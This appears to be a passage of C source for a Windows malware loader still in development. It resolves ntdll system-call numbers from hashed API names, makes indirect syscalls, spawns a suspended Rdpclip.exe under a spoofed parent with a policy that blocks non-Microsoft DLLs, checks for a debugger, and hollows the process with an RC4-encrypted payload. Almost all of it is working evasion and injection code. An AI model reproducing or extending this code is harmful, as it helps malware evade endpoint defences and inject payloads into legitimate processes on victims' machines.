                        syscallTableEntry->wSystemCall = (DWORD)((high << 8) | low);
                        printf("Systemcall SSN %d\n", syscallTableEntry->wSystemCall);
                       
                        // syscallTableEntry->pAddress = (PBYTE)0xDEADBEEF; // I got issues landing on ret a lot and this fixed it?
                       // syscallTableEntry->wSystemCall = (DWORD)58;
                       
                        //now all thats left is to call the function using an asm 
                        break;
                }
                byteCounter++;
            }
        }

    }
    //Now begin loop to populate list of syscall locaitons

        //Now since we don't want to pass strings of APIs we will hash and compare hashes to pre-hashed list.
        //See the API_Hashing module example
    return TRUE;
}


EXTERN_C void UpdateGlobals(DWORD input) {
    printf("Indexes of systemcalls %d\n", sizeof(pSystemCalls) / sizeof(pSystemCalls[0]));
   uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
    //PVOID address = (PVOID)(0xdeadbeef);
    //uint64_t* address = (uint64_t*)0x00007FF97312D232;

    printf("Getting JMP! 0x%p\n", address);
    gJMP = address;
    uint64_t address2 = (uint64_t)address;
    PULONG oldProts = NULL;
    getchar();
    printf("Input val to UpdateGloabls: %d\n", input);
    getchar();

    if (input == 0) { //Read
        printf("Wow! Read Syscall Getter called: %d\n", VxTable.Read.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.Read.wSystemCall;
        getchar();
        return (DWORD)VxTable.Read.wSystemCall;
    }
    else if (input == 1) { //Write
        printf("Wow! WRite Syscall Getter called: %d\n", VxTable.Write.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.Write.wSystemCall;
        getchar();
        return (DWORD)VxTable.Write.wSystemCall;
    }
    else if (input == 2) { //Allocate
        return VxTable.Allocate.wSystemCall;
    }
    else if (input == 3) { //Protect
        printf("Wow! Protect Syscall Getter called: %d\n", VxTable.Protect.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.Protect.wSystemCall;
        getchar();
        return VxTable.Protect.wSystemCall;
    }
    else if (input == 4) { //ResumeThread
        printf("Wow! Resume Syscall Getter called: %d\n", VxTable.ResumeThread.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.ResumeThread.wSystemCall;
        getchar();
        return VxTable.ResumeThread.wSystemCall;
    }
    else if (input == 5) { //QueryInfoProcess
        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.QueryInfoProcess.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.QueryInfoProcess.wSystemCall;
        getchar();
        return VxTable.QueryInfoProcess.wSystemCall;
    }
    else if (input == 6) { //CreateUserProcess
        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.CreateUserProcess.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.CreateUserProcess.wSystemCall;
        getchar();
        return VxTable.CreateUserProcess.wSystemCall;
    }
    else if (input == 7) { //CreateProcessPamaeters
        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.CreateProcessParametersEx.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.CreateProcessParametersEx.wSystemCall;
        getchar();
        return VxTable.CreateProcessParametersEx.wSystemCall;
    }
    else if (input == 8) { //InitUNicodeString
        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.CreateProcessParametersEx.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.InitUnicodeString.wSystemCall;
        getchar();
        return VxTable.InitUnicodeString.wSystemCall;
    }
    printf("Syscall input not found, check your input in C or RCX\n");

}

//\
https://offensivedefence.co.uk/posts/ntcreateuserprocess/ <- super helpful resource!
void customCreateProcess(IN PWSTR procName, IN PWSTR dir, IN PWSTR commandLine, OUT HANDLE* hProceessOut, OUT HANDLE* hThreadOut) {
    NTSTATUS result;

    // Obtain function pointers from VxTable (assuming they are correctly initialized)
    fnNtCreateUserProcess NtCreateUserProcess = (fnNtCreateUserProcess)VxTable.CreateUserProcess.pAddress;
    fnRtlInitUnicodeString RtlCreateProcessParametersEx = (fnRtlInitUnicodeString)VxTable.CreateProcessParametersEx.pAddress;
    fnRtlInitUnicodeString RtlInitUnicodeString = (fnRtlInitUnicodeString)VxTable.InitUnicodeString.pAddress;
    fnNtOpenProcess NtOpenProcess = (fnNtOpenProcess)VxTable.OpenProcess.pAddress;

    // Define strings
    UNICODE_STRING NtImagePath, CurrentDirectory, CommandLine;
    RtlInitUnicodeString(&NtImagePath, procName);
    RtlInitUnicodeString(&CurrentDirectory, dir);
    RtlInitUnicodeString(&CommandLine, commandLine);

    // User process parameters
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, &CurrentDirectory, &CommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZE);

    // Set process creation flags for suspended state
    ProcessParameters->Flags |= PROCESS_CREATE_FLAGS_SUSPENDED; // <---- Found the flag from process hacker libs 
                                                                // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L1219

    // Initialize attribute list
    PPS_ATTRIBUTE_LIST AttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE) * 3);
    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

    // Set image name attribute
    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[0].Size = NtImagePath.Length;
    AttributeList->Attributes[0].ValuePtr = (ULONG_PTR)NtImagePath.Buffer;

    // Obtain handle to parent process (assuming gCurrentSyscall is correctly set)
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
    CLIENT_ID cid = { (HANDLE)10104, NULL };
    HANDLE hParent = NULL;

    //This indirect works, its the ones w lots of params that are difficult... but at least this one is good!
    gCurrentSyscall = VxTable.OpenProcess.wRCXVal;
    result = NoahRead3(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);
    //result = NtOpenProcess(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);
    printf("NTSTATUS: %d\n", result);

    // Set parent process attribute
    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
    AttributeList->Attributes[1].Size = sizeof(HANDLE);
    AttributeList->Attributes[1].ValuePtr = hParent;

    // Add process mitigation attribute (example)
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;
    AttributeList->Attributes[2].Size = sizeof(DWORD64);
    AttributeList->Attributes[2].ValuePtr = &policy;

    // process create info
    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;

    // Spawn process
    HANDLE hProcess, hThread = NULL;
    //This works.
    result = NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
   
    //TODO: fix this one
    // result = NoahRead3(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, &AttributeList);
    *hProceessOut = hProcess;
    *hThreadOut = hThread;

    // Free allocated memory
    HeapFree(GetProcessHeap(), 0, AttributeList);

    // Cleanup process parameters structure if needed
    // RtlDestroyProcessParameters(ProcessParameters);


}
int main() {

    initializeSystemCalls();

    //shifted this up so we can run our new createproc
    PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
    //Read from GS register at 0x30 offset for TEB
    //Using TEB we can find PEB
    PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
    PVOID pNtdllBase = NULL;
    printf("Getting base...\n");


    GetBase(pCurrentPEB, &pNtdllBase);
    printf("NTDLL Base: 0x%p\n", pNtdllBase);
    getchar();

    //Now with the base address of NTDLL we need to get all of the functions within it, the Image Export Directory
    PIMAGE_EXPORT_DIRECTORY ppImageExportDirectory = NULL;
    DWORD dwDLLSize = 0; // expirementally about how many functions to expect :shrug:
    GetImageExportDir(pNtdllBase, &ppImageExportDirectory, &dwDLLSize);
    printf("DLL Size (bytes): %d", dwDLLSize);


    STARTUPINFOA Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };
    BOOL success = FALSE;

    PWSTR procName = L"\\??\\C:\\Windows\\System32\\Rdpclip.exe"; // should probably hash this too
    PWSTR dir = L"C:\\Windows\\System32";
    PWSTR commandLine = L"\"C:\\Windows\\System32\\Rdpclip.exe\"";
    VX_TABLE_ENTRY CreateUserProcess = { 0 };
    VX_TABLE_ENTRY CreateProcessParameters = { 0 };
    VX_TABLE_ENTRY InitUnicodeString = { 0 };
    VX_TABLE_ENTRY OpenProcess = { 0 };

    

    VxTable.CreateUserProcess = CreateUserProcess;
    VxTable.CreateUserProcess.dwHash = strtoull("01E99E27", NULL, 16);

    VxTable.CreateProcessParametersEx = CreateProcessParameters;
    VxTable.CreateProcessParametersEx.dwHash = strtoull("FA96CFC9", NULL, 16);


    VxTable.InitUnicodeString = InitUnicodeString;
    VxTable.InitUnicodeString.dwHash = strtoull("0A95CC97", NULL, 16);

    VxTable.OpenProcess = OpenProcess;
    VxTable.OpenProcess.dwHash = strtoull("10029746", NULL, 16);

    VxTable.CreateUserProcess.wRCXVal = 6;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.CreateUserProcess);
    
    VxTable.CreateProcessParametersEx.wRCXVal = 7;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.CreateProcessParametersEx);

    VxTable.InitUnicodeString.wRCXVal = 8;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.InitUnicodeString);


    VxTable.InitUnicodeString.wRCXVal = 9;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.OpenProcess);



    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    customCreateProcess(procName, dir, commandLine, &hProcess, &hThread); // ntcreateuserprocess w/ DLL block policy 
    /*
    success = CreateProcessA("C:\\Windows\\System32\\Rdpclip.exe", NULL,
        NULL, //p handle cannot be inheritied by child process
        NULL, //thread handle cannot be inheritied yb child since NULL
        PROCESS_ALL_ACCESS,
        CREATE_SUSPENDED,
        NULL, //use def environmen vars
        NULL, //inherit current dir as parent.
        &Si,
        &Pi
    );
    */
    

    //Now with the PEB address we can find the base of NTDLL to assist in finding fuynciton syscall instructions
    //To do this we must navigate through the PEB_LDR_DATA struct which contains all the loaded modules in the process.



    VX_TABLE_ENTRY Write = { 0 };
    VX_TABLE_ENTRY Read = { 0 };
    VX_TABLE_ENTRY Allocate= { 0 };
    VX_TABLE_ENTRY Protect = {0};
    VX_TABLE_ENTRY ResumeThread = { 0 };
    VX_TABLE_ENTRY QueryInfoProcess = { 0 };


    //Hashes retrieved from Hasher code
    VxTable.Write = Write;
    VxTable.Write.dwHash = strtoull("C1189C40", NULL, 16);
    
    VxTable.Read = Read;
    VxTable.Read.dwHash = strtoull("BE6B6431", NULL, 16);
    
    VxTable.Allocate = Allocate;
    VxTable.Allocate.dwHash = strtoull("FE83CCDA", NULL, 16);
    
    VxTable.Protect = Protect;
    VxTable.Protect.dwHash = strtoull("87C51496", NULL, 16);

    VxTable.ResumeThread = ResumeThread;
    VxTable.ResumeThread.dwHash = strtoull("2F7CB09E", NULL, 16);

    VxTable.QueryInfoProcess = QueryInfoProcess;
    VxTable.QueryInfoProcess.dwHash = strtoull("4F0DBC50", NULL, 16);



    printf("0x%0.8X\n", VxTable.Protect.dwHash);

    printf("Struct populated...\n");

    //Now with the image export directory we can loop through function names and find the desired functions for syscalls!
    printf("Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %d\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);

    // i wish there was a way to pass the entire struct and then loop through this


    //i love all functions equally, but this one is defintely up there.
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Read);
    VxTable.Read.wRCXVal = 0;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Write);
    VxTable.Write.wRCXVal = 1;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Allocate);
    VxTable.Allocate.wRCXVal = 2;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Protect);
    VxTable.Protect.wRCXVal = 3;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.ResumeThread);
    VxTable.ResumeThread.wRCXVal = 4;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.QueryInfoProcess);
    VxTable.QueryInfoProcess.wRCXVal = 5;
    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.CreateUserProcess);

    detectDebug();

    printf("Second run: Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %hu\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
    //Now we just have to call the function using assembly temmplates!
    getchar();


    getchar();
    hollowProcess(Pi, sizeof(Rc4CipherText),hProcess,hThread);


    getchar();
    return 0;
}
